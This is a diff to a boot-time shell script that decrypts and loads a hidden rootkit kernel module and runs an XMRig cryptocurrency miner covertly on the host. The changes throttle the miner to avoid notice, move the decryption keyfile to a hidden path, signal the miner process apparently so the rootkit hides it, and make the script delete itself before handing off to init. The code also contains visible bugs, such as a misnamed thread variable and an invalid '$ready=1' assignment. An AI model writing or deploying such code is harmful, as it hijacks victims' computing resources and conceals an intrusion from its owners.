@@ -6,8 +6,6 @@
 #rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
 #xmrig binary and config file /opt/xmrig/FILES
 
-mount -o remount,rw /
-
 module_compile_dir="/boot/rootkit/src"
 module_dir="/lib/modules/$(uname -r)/extra"
 
@@ -25,6 +23,17 @@ if [ ! -d "$xmrig_dir" ]; then
 	mkdir -p "$xmrig_dir"
 fi
 
+
+reads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
+usable_threads=$((threads * 20 / 100))
+rx_array="\"rx\": ["
+for ((n = 0; n < $usable_threads; n++));do
+    rx_array+="-1"
+    if [ $n -lt $((usable_threads-1)) ];then
+        rx_array+=", "
+    fi
+done
+rx_array+="],"
 #if binary or config dont exist at specified location then reaquire it
 #deleting everything from the directory to be safe and to clean up
 if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
@@ -42,6 +51,7 @@ if [ ! -e "$xmrig_binary" ] || [ ! -e "$xmrig_config" ]; then
 	
 	sed -i "s|\"url\": \".*\"|\"url\": \"$pool\"|" "$xmrig_config"
 	sed -i "s|\"user\": \".*\"|\"user\": \"$wallet\"|" "$xmrig_config"
+    sed -i "s|\"rx\": \[.*\]|$rx_array|" "$xmrig_config"
 ) &
 
 fi
@@ -53,14 +63,13 @@ if [ ! -d "$module_dir" ]; then
 fi
 
 #cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
-if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/keyfile.bin" ]; then
-	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/keyfile.bin"
+if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/.keyfile.bin" ]; then
+	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/.keyfile.bin"
 fi
 insmod "/dev/shm/rootkit.ko"
 rm -rf "/dev/shm/rootkit.ko"
 
 
-threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
 
 #check if min number of threads is six
 if [ "$threads" -gt 4 ]; then
@@ -68,11 +77,18 @@ if [ "$threads" -gt 4 ]; then
 (	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
 		sleep 5
 	done
-	usable_threads=$((threads * 20 / 100))
-	"$xmrig_binary" --config="$xmrig_config" --threads=$usable_threads > /dev/null 2>&1 &
-	echo "xmrig works!"
+	nohup "$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1	
 	kill -64 $!
+
+	$ready=1
 ) &
 fi
+
+(
+	while [ ! "$ready" -eq 1 ]; do
+		sleep 5
+	done
+	rm -- "$0"
+) &
 
 exec /sbin/init "$@"
